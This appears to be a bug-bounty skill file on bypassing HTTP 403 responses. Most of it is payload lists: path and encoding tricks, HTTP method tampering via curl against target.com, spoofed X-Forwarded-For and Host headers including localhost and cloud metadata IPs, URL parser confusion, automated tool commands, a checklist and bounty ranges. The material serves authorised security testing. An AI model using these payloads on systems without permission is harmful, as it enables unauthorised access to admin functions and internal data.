---
name: 403-bypass-testing
description: HTTP 403 Forbidden bypass techniques: path traversal, HTTP method tampering, header injection, URL normalization bypass, IP-based bypass.
---

# 403 Bypass Testing

## Overview

When you get a 403 Forbidden, it doesn't always mean access denied. Many 403 responses are misconfigured and can be bypassed with simple techniques.

---

## Path Traversal Bypass

### Basic Techniques
```
/admin/../admin
/admin/./
/./admin/
/admin%2f
/admin%252f
/admin..
/admin...
/ADMIN
/Admin
/aDmIn
```

### Encoding Bypass
```
/admin%20
/admin%09
/admin%0d%0a
/admin/
//admin//
/./admin/./
/admin..;/
/admin.json
/admin.css
/admin.js
```

### Double Encoding
```
/admin%252f
/admin%25252f
```

---

## HTTP Method Tampering

### Test All Methods
```bash
# GET (baseline)
curl -I https://target.com/admin

# POST
curl -X POST -I https://target.com/admin

# PUT
curl -X PUT -I https://target.com/admin

# DELETE
curl -X DELETE -I https://target.com/admin

# PATCH
curl -X PATCH -I https://target.com/admin

# OPTIONS
curl -X OPTIONS -I https://target.com/admin

# HEAD
curl -X HEAD -I https://target.com/admin

# TRACE
curl -X TRACE -I https://target.com/admin
```

### Method Override Headers
```
X-HTTP-Method: GET
X-HTTP-Method-Override: GET
X-Method-Override: GET
```

---

## Header Injection Bypass

### IP-Based Headers
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 10.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-True-IP: 127.0.0.1
```

### Host Header Manipulation
```
Host: target.com
Host: localhost
Host: 127.0.0.1
Host: target.com:80
Host: target.com:443
Host: target.com%0d%0a
Host: target.com%20
```

### Referer/Origin Headers
```
Referer: https://target.com/admin
Origin: https://target.com
Origin: null
```

---

## URL Parser Confusion

### @ Symbol Trick
```
https://target.com@127.0.0.1/admin
https://admin@target.com/
https://target.com%40127.0.0.1/admin
```

### Protocol Confusion
```
http://target.com/admin
https://target.com/admin
ftp://target.com/admin
```

### Port Confusion
```
https://target.com:443/admin
https://target.com:80/admin
https://target.com:8443/admin
```

---

## Path Normalization Bypass

### Case Variation
```
/Admin
/ADMIN
/aDmIn
/adMiN
```

### Unicode Normalization
```
/admin
/%61dmin
/admin%20
/admin%09
/admin%0a
/admin%0d
/admin%00
```

### Trailing Characters
```
/admin/
/admin.
/admin..
/admin...
/admin..;
/admin..../
/admin;/
/admin?
admin#
```

---

## IP-Based Bypass

### Internal IP Headers
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 172.16.0.1
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: ::1
X-Forwarded-For: 0.0.0.0
```

### Cloud Metadata IPs
```
X-Forwarded-For: 169.254.169.254
X-Forwarded-For: 169.254.170.2
```

---

## Content-Type Bypass

```
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
```

---

## Automated Bypass Tools

```bash
# byp4xx - automated 403 bypass
byp4xx https://target.com/admin

# nomore403 - 20+ bypass techniques
nomore403 https://target.com/admin

# Custom bypass script
for method in GET POST PUT DELETE PATCH; do
    curl -X $method -I "https://target.com/admin" 2>/dev/null | head -1
done
```

---

## Testing Checklist

- [ ] Test all HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE)
- [ ] Test method override headers
- [ ] Test IP-based headers (X-Forwarded-For, etc.)
- [ ] Test Host header manipulation
- [ ] Test path traversal (../admin, admin/.., etc.)
- [ ] Test case variation (Admin, ADMIN, aDmIn)
- [ ] Test URL encoding (%2f, %20, %09)
- [ ] Test double encoding (%252f)
- [ ] Test trailing characters (/, .., ;, ?, #)
- [ ] Test @ symbol trick
- [ ] Test protocol confusion (http://, https://, ftp://)
- [ ] Test port confusion (:443, :80, :8443)
- [ ] Test Unicode normalization
- [ ] Test Content-Type change
- [ ] Test Referer/Origin headers

---

## Impact Assessment

| Finding | Severity | Bounty Range |
|---------|----------|--------------|
| 403 bypass to public page | Low | $0-$100 |
| 403 bypass to admin panel (no auth) | High | $2,000-$5,000 |
| 403 bypass to sensitive data | High | $2,000-$5,000 |
| 403 bypass to admin functions | Critical | $5,000-$10,000+ |
| 403 bypass to internal API | Critical | $5,000-$15,000+ |
